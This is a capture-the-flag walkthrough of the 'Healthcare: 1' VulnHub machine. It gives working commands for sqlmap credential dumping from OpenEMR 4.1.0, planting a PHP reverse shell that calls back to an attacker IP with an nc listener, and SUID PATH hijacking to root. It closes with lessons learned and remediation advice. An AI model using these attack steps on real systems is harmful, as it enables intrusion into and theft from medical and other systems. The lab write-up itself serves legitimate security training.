# Healthcare: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.0.158 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | user.txt + root.txt |
| **Source** | [HackingArticles](https://www.hackingarticles.in/healthcare-1-vulnhub-walkthrough/) |

## Attack Summary

Healthcare: 1 is a medium boot2root machine with two flags. The web server hosts OpenEMR v4.1.0, which carries a known SQL injection vulnerability in the login endpoint. SQLmap dumps the users table, revealing credentials for two accounts. Admin access to OpenEMR allows editing a PHP configuration file directly through the web interface, which is replaced with a reverse shell. On the system, a SUID binary (`healthcheck`) calls `fdisk` without an absolute path, enabling PATH hijacking to spawn a root shell.

## Methodology

1. Host discovery and port scan
2. Web directory brute-force — discover `/openemr`
3. OpenEMR version fingerprinting
4. SQL injection via sqlmap — dump credentials
5. Admin login and PHP file replacement (reverse shell)
6. Shell as `www-data`, lateral move to `medical`
7. SUID binary PATH hijacking for root

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.0.0/24
```

Target identified at `192.168.0.158`.

```bash
nmap -A 192.168.0.158
```

![nmap](images/01-nmap.png)

**Open ports:**

| Port | Service |
|---|---|
| 21 | FTP |
| 80 | HTTP (Apache) |

## Step 2: Web Enumeration

Manual browsing revealed nothing useful from the default page. Directory brute-force with gobuster:

```bash
gobuster dir \
  -u http://192.168.0.158/ \
  -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -t 100 \
  -e
```

![enumeration](images/02-enum.png)

Discovered: `/openemr` — a login page. The page source and version string confirm **OpenEMR v4.1.0**, which has a known SQL injection vulnerability.

## Step 3: SQL Injection — Credential Extraction

The login endpoint `validateUser.php` is vulnerable to SQL injection. Enumerate databases:

```bash
sqlmap -u "http://192.168.0.158/openemr/interface/login/validateUser.php?u=" \
  --dbs \
  --batch
```

Dump the `users` table from the `openemr` database:

```bash
sqlmap -u "http://192.168.0.158/openemr/interface/login/validateUser.php?u=" \
  -D openemr \
  -T users \
  --dump \
  --batch
```

**Credentials extracted:**

| Username | Password |
|---|---|
| ackbar | (cracked from hash) |
| medical | (cracked from hash) |

The `ackbar` account has admin privileges.

## Step 4: Initial Foothold — PHP Reverse Shell

Log in to OpenEMR as `ackbar` (admin). Navigate to the Administration tab and locate the editable `config.php` file. Replace its contents entirely with a PHP reverse shell (e.g., pentestmonkey's `php-reverse-shell.php`), updating the IP to the attacker's address:

```php
$ip = '192.168.0.100';   // attacker IP
$port = 1234;
```

Start a listener:

```bash
nc -lvp 1234
```

Save the file and reload the page. The shell connects back.

![exploit](images/03-exploit.png)

Upgrade to a TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Switch to the `medical` user using credentials recovered via SQLi:

```bash
su medical
# enter password from sqlmap dump
```

![shell](images/04-shell.png)

## Step 5: Privilege Escalation — SUID PATH Hijack

Find SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Notable result: `/usr/bin/healthcheck`

Inspect what the binary calls:

```bash
strings /usr/bin/healthcheck
```

The binary invokes `ifconfig` and `fdisk` without absolute paths — vulnerable to PATH hijacking.

Create a malicious `fdisk` in `/tmp`:

```bash
cd /tmp
echo '/bin/bash' > fdisk
chmod 777 fdisk
export PATH=/tmp:$PATH
```

Execute the SUID binary:

```bash
/usr/bin/healthcheck
whoami
# root
```

Retrieve the flags:

```bash
cat /root/root.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

- OpenEMR 4.1.0 is a well-known vulnerable application. Keeping medical or administrative software up to date is critical, especially when it is internet-facing.
- Allowing authenticated users to edit PHP files through the web interface effectively grants them remote code execution. Application-managed file editing should never modify server-side executable files.
- SUID binaries that invoke commands without absolute paths are exploitable with PATH manipulation. This is a systemic design flaw — all system calls from privileged binaries must use absolute paths.

## Remediation

| Vulnerability | Fix |
|---|---|
| SQL injection in OpenEMR 4.1.0 | Update OpenEMR to a patched version; use parameterized queries |
| Editable PHP config via web UI | Prohibit web-based editing of server-side files; enforce read-only file permissions |
| SUID binary with relative path calls | Use absolute paths in all system() calls; audit SUID binaries regularly |
| Credential reuse across accounts | Enforce unique passwords per account |
